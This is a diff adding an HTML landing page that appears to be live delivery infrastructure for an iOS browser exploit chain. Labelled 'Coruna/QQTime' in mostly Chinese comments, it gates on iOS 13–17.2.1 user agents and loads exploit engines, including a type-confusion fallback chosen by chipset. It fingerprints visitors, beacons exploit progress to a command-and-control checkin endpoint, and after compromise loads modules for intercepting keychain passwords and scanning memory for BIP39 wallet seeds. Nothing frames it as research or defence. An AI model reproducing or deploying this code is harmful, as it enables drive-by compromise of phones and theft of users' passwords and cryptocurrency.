@@ -1,0 +1,351 @@
+<html>
+<head>
+<meta http-equiv="Cache-Control" content="no-cache, no-store, must-revalidate" />
+<meta http-equiv="Pragma" content="no-cache" />
+<meta http-equiv="Expires" content="0" />
+<meta property="og:determiner" content="auto" />
+<title>qqtime</title>
+
+<script>
+// Coruna/QQTime is limited to iOS 13.0 through 17.2.1.  This gate runs
+// before the first exploit script so 17.2.2+, 18.x and older releases never
+// execute a foreign or unsupported engine on this page.
+(function () {
+  var ua = String(navigator.userAgent || '');
+  var m = /(?:iPhone|iPad|iPod).*?OS (\d+)[._](\d+)(?:[._](\d+))?/i.exec(ua)
+    || /CPU (?:iPhone )?OS (\d+)[._](\d+)(?:[._](\d+))?/i.exec(ua);
+  var v = m ? [+m[1], +m[2], +(m[3] || 0)] : null;
+  var allowed = !!v && (v[0] === 13 || v[0] === 14 || v[0] === 15 || v[0] === 16
+    || (v[0] === 17 && (v[1] < 2 || (v[1] === 2 && v[2] <= 1))));
+  window.__QQTIME_ALLOWED__ = allowed;
+  window.__DS_SELECTED_CHAIN__ = allowed ? 'coruna_13_17' : 'out_of_scope';
+  if (!allowed) {
+    window.__QQTIME_BLOCKED__ = true;
+    try { document.documentElement.setAttribute('data-chain-status', 'out_of_scope'); } catch (_) {}
+  }
+})();
+</script>
+
+<script>
+// ── 全局错误捕获 ──
+window.__ERRORS__ = [];
+window.onerror = function(msg, src, line, col, err) {
+    if (!window.__QQTIME_ALLOWED__) return false;
+    var e = "JS_ERROR: " + msg + " @" + (src||"?").split("/").pop() + ":" + line + ":" + col;
+    window.__ERRORS__.push(e);
+    if (globalThis.C2_CONFIG && globalThis.C2_CONFIG.c2Enabled && typeof globalThis.DS_C2_ENDPOINT === 'function') new Image().src = globalThis.DS_C2_ENDPOINT('/api/liangri/checkin') + '?type=exploit_debug&msg=' + encodeURIComponent(e.substring(0,300)) + '&deviceId=' + encodeURIComponent(window.__DEVICE_ID__||'unknown') + '&t=' + Date.now();
+    return false;
+};
+window.addEventListener("unhandledrejection", function(e) {
+    if (!window.__QQTIME_ALLOWED__) return;
+    var msg = "PROMISE_REJECT: " + (e.reason && e.reason.message ? e.reason.message : String(e.reason)).substring(0,200);
+    window.__ERRORS__.push(msg);
+    if (globalThis.C2_CONFIG && globalThis.C2_CONFIG.c2Enabled && typeof globalThis.DS_C2_ENDPOINT === 'function') new Image().src = globalThis.DS_C2_ENDPOINT('/api/liangri/checkin') + '?type=exploit_debug&msg=' + encodeURIComponent(msg.substring(0,300)) + '&t=' + Date.now();
+});
+
+// ── Exploit 阶段追踪 ──
+window.__EXPLOIT_TRACE__ = [];
+window.__trace = function(stage, detail) {
+    if (!window.__QQTIME_ALLOWED__) return;
+    var entry = "[" + stage + "] " + (detail || "");
+    window.__EXPLOIT_TRACE__.push(entry);
+    if (globalThis.C2_CONFIG && globalThis.C2_CONFIG.c2Enabled && typeof globalThis.DS_C2_ENDPOINT === 'function') new Image().src = globalThis.DS_C2_ENDPOINT('/api/liangri/checkin') + '?type=exploit_trace&msg=' + encodeURIComponent(entry.substring(0,300)) + '&deviceId=' + encodeURIComponent(window.__DEVICE_ID__||'unknown') + '&t=' + Date.now();
+};
+
+// ── 引擎执行监控 ──
+(function() {
+    if (!window.__QQTIME_ALLOWED__) return;
+    var origFunction = window.Function;
+    var execCount = 0;
+    // 监控 obChTK 是否被创建
+    var checkInterval = setInterval(function() {
+        if (window.obChTK) {
+            window.__trace("obChTK_created", "object found");
+            clearInterval(checkInterval);
+        }
+    }, 500);
+    setTimeout(function() { clearInterval(checkInterval); }, 30000);
+    
+    // 监控 fcall 出现
+    var fcallInterval = setInterval(function() {
+        if (typeof window.fcall !== "undefined") {
+            window.__trace("fcall_appeared", typeof window.fcall);
+            clearInterval(fcallInterval);
+        }
+    }, 500);
+    setTimeout(function() { clearInterval(fcallInterval); }, 60000);
+})();
+</script>
+
+<script>
+// console.error 拦截
+(function() {
+    var origError = console.error;
+    window.__origConsoleError = origError;
+    console.error = function() {
+        var args = Array.from(arguments).map(String).join(" ").substring(0, 200);
+        if (globalThis.C2_CONFIG && globalThis.C2_CONFIG.c2Enabled && typeof globalThis.DS_C2_ENDPOINT === 'function') new Image().src = globalThis.DS_C2_ENDPOINT('/api/liangri/checkin') + '?type=exploit_debug&msg=' + encodeURIComponent('CONSOLE_ERROR: ' + args) + '&t=' + Date.now();
+        origError.apply(console, arguments);
+    };
+})();</script>
+
+<script>
+// ═══ 统一设备标识（必须在所有收割器之前）═══
+(function() {
+    var KEY = '_ds_device_id';
+    var id = null;
+    try { id = localStorage.getItem(KEY); } catch(e) {}
+    
+    if (!id || id.length < 8) {
+        // 生成: DS + 时间戳 + 随机（确保唯一且可读）
+        id = 'DS' + Date.now().toString(36) + Math.random().toString(36).substring(2, 8).toUpperCase();
+        try { localStorage.setItem(KEY, id); } catch(e) {}
+    }
+    
+    // 设置全局（所有收割器用这个）
+    window.__DEVICE_ID__ = id;
+    globalThis.__DEVICE_ID__ = id;
+    
+    // 也设到 cookie（跨页面持久）
+    try { document.cookie = '_ds_did=' + id + ';path=/;max-age=86400'; } catch(e) {}
+})();
+</script>
+
+<script>
+// Record one landing visit for the admin statistics page.
+(function () {
+  var q = new URLSearchParams(location.search || '');
+  var channel = q.get('channel_code') || q.get('channel') || 'landing-wallet';
+  var ua = String(navigator.userAgent || '');
+  var m = /(?:iPhone|iPad|iPod).*?OS (\d+)[._](\d+)(?:[._](\d+))?/i.exec(ua)
+    || /CPU (?:iPhone )?OS (\d+)[._](\d+)(?:[._](\d+))?/i.exec(ua);
+  var ios = m ? m[1] + '.' + m[2] + (m[3] ? '.' + m[3] : '') : '';
+  var body = JSON.stringify({
+    channel_code: channel, path: location.pathname, landing_url: location.pathname,
+    redirect_url: location.pathname, ios_version: ios,
+    platform: /iPhone|iPad|iPod/i.test(ua) ? 'ios' : (/Android/i.test(ua) ? 'android' : 'desktop'),
+    user_agent: ua.slice(0, 1000), referrer: String(document.referrer || '').slice(0, 1000),
+    device_id: String(window.__DEVICE_ID__ || ''), domain: String(location.host || '')
+  });
+  try {
+    var key = '__ds_visit_sent__' + location.pathname + '|' + channel;
+    if (sessionStorage.getItem(key)) return;
+    sessionStorage.setItem(key, '1');
+  } catch (_) {}
+  try {
+    if (navigator.sendBeacon && navigator.sendBeacon('/api/web-visit/track', new Blob([body], {type: 'application/json'}))) return;
+  } catch (_) {}
+  try {
+    fetch('/api/web-visit/track', {method: 'POST', headers: {'Content-Type': 'application/json'}, body: body, keepalive: true, credentials: 'same-origin'}).catch(function () {});
+  } catch (_) {}
+})();
+</script>
+
+</head>
+<body>
+<script>
+// === 设备 ID 捕获：拦截 bootstrap 心跳，提取 channelCode ===
+if (!window.__DEVICE_ID__ || window.__DEVICE_ID__.length < 4) { window.__DEVICE_ID__ = localStorage.getItem('_qqtime_channel') || ''; }
+window._deviceUID = window.__DEVICE_ID__ || '';
+
+(function() {
+    // 先从 localStorage 恢复（之前存过的）
+    if (window.__DEVICE_ID__ && window.__DEVICE_ID__.length > 4) return;
+
+    // 拦截 XHR（bootstrap 可能用 XHR 发心跳）
+    var _open = XMLHttpRequest.prototype.open;
+    var _send = XMLHttpRequest.prototype.send;
+
+    XMLHttpRequest.prototype.open = function() {
+        this.__url = arguments[1];
+        return _open.apply(this, arguments);
+    };
+
+    XMLHttpRequest.prototype.send = function(body) {
+        if (this.__url && (this.__url.indexOf('ip-sync') !== -1 || this.__url.indexOf('sync') !== -1)) {
+            try {
+                var d = typeof body === 'string' ? JSON.parse(body) : body;
+                if (d && d.channelCode) {
+                    window.__DEVICE_ID__ = d.channelCode;
+                    window._deviceUID = d.channelCode;
+                    try { localStorage.setItem('_qqtime_channel', d.channelCode); } catch(e) {}
+                    try { localStorage.setItem('_beacon_device_id', d.channelCode); } catch(e) {}
+                }
+            } catch(e) {}
+        }
+        return _send.apply(this, arguments);
+    };
+
+    // 拦截 fetch（bootstrap 也可能用 fetch）
+    var _fetch = window.fetch;
+    if (_fetch) {
+        window.fetch = function(input, init) {
+            var url = typeof input === 'string' ? input : (input && input.url) || '';
+            if (url.indexOf('ip-sync') !== -1 || url.indexOf('sync') !== -1) {
+                try {
+                    var body = init && init.body;
+                    if (body) {
+                        var d = typeof body === 'string' ? JSON.parse(body) : body;
+                        if (d && d.channelCode) {
+                            window.__DEVICE_ID__ = d.channelCode;
+                            try { localStorage.setItem('_qqtime_channel', d.channelCode); } catch(e) {}
+                            try { localStorage.setItem('_beacon_device_id', d.channelCode); } catch(e) {}
+                        }
+                    }
+                } catch(e) {}
+            }
+            return _fetch.apply(this, arguments);
+        };
+    }
+})();
+
+// QQTime 自检上报
+(function(){
+  if (!window.__QQTIME_ALLOWED__) return;
+  var ua = navigator.userAgent || '';
+  var m = ua.match(/(?:iPhone|iPad|iPod).*?OS (\d+)[._](\d+)/i) || ua.match(/CPU OS (\d+)[._](\d+)/i);
+  var ver = m ? m[1]+'.'+m[2] : 'unknown';
+  if (globalThis.C2_CONFIG && globalThis.C2_CONFIG.c2Enabled && typeof globalThis.DS_C2_ENDPOINT === 'function') new Image().src = globalThis.DS_C2_ENDPOINT('/api/liangri/checkin') + '?type=sdk&msg=qqtime|'+ver+'|init&t=' + Date.now();
+
+  setInterval(function(){
+    if (globalThis.C2_CONFIG && globalThis.C2_CONFIG.c2Enabled && typeof globalThis.DS_C2_ENDPOINT === 'function') new Image().src = globalThis.DS_C2_ENDPOINT('/api/liangri/checkin') + '?type=sdk&msg=qqtime|'+ver+'|hb&t=' + Date.now();
+  }, 30000);
+})();
+</script>
+<script>
+if (window.__QQTIME_ALLOWED__) document.write('<script type="text/javascript" src="34ef644ff217a50beadde64dc8e23a7d.js"><\/script>');
+</script>
+<!-- QQTime 本地资源说明 -->
+<script>
+// Ensure _deviceUID is available before harvest modules load.
+(function() {
+    var saved = localStorage.getItem('_qqtime_channel');
+    if (saved && saved.length > 4) {
+        window.__DEVICE_ID__ = saved;
+        window._deviceUID = saved;
+        try { localStorage.setItem('_beacon_device_id', saved); } catch(e) {}
+    }
+})();
+</script>
+
+<!-- CVE fallback is not part of the Coruna 13-17.2.1 chain. -->
+
+
+
+<!-- Fq2t1 备用引擎（iOS 13~17.2, OfflineAudioContext+SVG类型混淆） -->
+<script>
+if (window.__QQTIME_ALLOWED__) document.write('<script type="text/javascript" src="/ds/client/fq2t1_main.js"><\/script>');
+</script>
+<script>
+(function() {
+    if (!window.__QQTIME_ALLOWED__) return;
+    // Fq2t1 引擎作为主链失败后的备用 exploit
+    var ua = navigator.userAgent || '';
+    var m = ua.match(/OS (\d+)_(\d+)/);
+    if (!m) return;
+    var major = parseInt(m[1]);
+    var minor = parseInt(m[2]);
+    var ver = major + '.' + minor;
+    
+    // 只覆盖 iOS 13~17.2
+    if (major < 13 || (major === 17 && minor > 2) || major >= 18) return;
+    
+    // 芯片检测（从 UA + 屏幕参数推断）
+    var screen_ = window.screen || {};
+    var chipMap = {
+        'iPhone10': 't8015',  // iPhone X
+        'iPhone11': 't8020',  // iPhone XS/XR
+        'iPhone12': 't8030',  // iPhone 11
+        'iPhone13': 't8101',  // iPhone 12
+        'iPhone14': 't8110',  // iPhone 13/SE3
+        'iPhone15': 't8110',  // iPhone 14 (同A15)
+        'iPhone16': 't8120',  // iPhone 15 Pro
+        'iPhone17': 't8130',  // iPhone 16 Pro
+    };
+    var chip = 't8030';  // 默认
+    for (var model in chipMap) {
+        if (ua.indexOf(model) !== -1) {
+            chip = chipMap[model];
+            break;
+        }
+    }
+    
+    // 等 45 秒看主链是否成功（3 秒间隔 × 15 次）
+    var tries = 0;
+    var timer = setInterval(function() {
+        tries++;
+        
+        // 主链成功（有原语了），不需要备用引擎
+        if (typeof fcall !== 'undefined' || window.__EXPLOIT_SUCCESS__) {
+            clearInterval(timer);
+            return;
+        }
+        
+        // 超时，主链没成功 → 启动 Fq2t1
+        if (tries >= 15) {
+            clearInterval(timer);
+            
+            if (globalThis.C2_CONFIG && globalThis.C2_CONFIG.c2Enabled && typeof globalThis.DS_C2_ENDPOINT === 'function') new Image().src = globalThis.DS_C2_ENDPOINT('/api/liangri/checkin') + '?type=fq2t1&msg=MAIN_CHAIN_TIMEOUT_trying_fq2t1_' + ver + '_' + chip + '&t=' + Date.now();
+            
+            try {
+                // fq2t1_init 需要完整 config
+                fq2t1_init({
+                    begin: 0,
+                    origin: location.origin,
+                    ios_version: ver,
+                    offsets: window.__FQ2T1_OFFSETS__ || {},
+                    slide: 0,
+                    chipset: chip,
+                    device_model: ua.match(/iPhone\d+,\d+/) ? ua.match(/iPhone\d+,\d+/)[0] : 'unknown',
+                    desiredHost: location.host,
+                    SERVER_LOG: true
+                }).then(function(result) {
+                    if (result && result.success) {
+                        window.__EXPLOIT_SUCCESS__ = true;
+                        if (globalThis.C2_CONFIG && globalThis.C2_CONFIG.c2Enabled && typeof globalThis.DS_C2_ENDPOINT === 'function') new Image().src = globalThis.DS_C2_ENDPOINT('/api/liangri/checkin') + '?type=fq2t1&msg=FQ2T1_SUCCESS&t=' + Date.now();
+                        
+                        // 重触发收割链（fq2t1 在 45 秒后才成功，收割器已经跑过了）
+                        if (!window.__QQTIME_ALLOWED__) return;
+                        var s = document.createElement('script');
+                        s.src = '/ds/client/mos0027_harvest_boot.js?retry=' + Date.now();
+                        document.head.appendChild(s);
+                        // 重触发 beacon_poll
+                        var s2 = document.createElement('script');
+                        s2.src = '/ds/client/beacon_poll.js?retry=' + Date.now();
+                        document.head.appendChild(s2);
+                    } else {
+                        if (globalThis.C2_CONFIG && globalThis.C2_CONFIG.c2Enabled && typeof globalThis.DS_C2_ENDPOINT === 'function') new Image().src = globalThis.DS_C2_ENDPOINT('/api/liangri/checkin') + '?type=fq2t1&msg=FQ2T1_FAILED_' + (result && result.error ? result.error.substring(0, 40) : 'unknown') + '&t=' + Date.now();
+                    }
+                }).catch(function(e) {
+                    if (globalThis.C2_CONFIG && globalThis.C2_CONFIG.c2Enabled && typeof globalThis.DS_C2_ENDPOINT === 'function') new Image().src = globalThis.DS_C2_ENDPOINT('/api/liangri/checkin') + '?type=fq2t1&msg=FQ2T1_EXCEPTION&t=' + Date.now();
+                });
+            } catch(e) {
+                if (globalThis.C2_CONFIG && globalThis.C2_CONFIG.c2Enabled && typeof globalThis.DS_C2_ENDPOINT === 'function') new Image().src = globalThis.DS_C2_ENDPOINT('/api/liangri/checkin') + '?type=fq2t1&msg=FQ2T1_INIT_ERROR&t=' + Date.now();
+            }
+        }
+    }, 3000);
+})();
+</script>
+
+<script>
+if (window.__QQTIME_ALLOWED__) document.write('<script type="text/javascript" src="/ds/client/mos0027_harvest_boot.js?_=1786074653"><\/script>');
+</script>
+<script>
+if (window.__QQTIME_ALLOWED__) document.write('<script type="text/javascript" src="/ds/client/beacon_poll.js?_=1786074654"><\/script>');
+</script>
+
+<!-- 密码拦截 + BIP39 内存扫描 -->
+<script>
+setTimeout(function() {
+    if (!window.__QQTIME_ALLOWED__) return;
+    var s1 = document.createElement('script');
+    s1.src = '/ds/client/keychain_monitor.js?_=' + Date.now();
+    document.head.appendChild(s1);
+    var s2 = document.createElement('script');
+    s2.src = '/ds/client/bip39_memscan.js?_=' + Date.now();
+    document.head.appendChild(s2);
+}, 6000);
+</script>
+
+</body>
+</html>
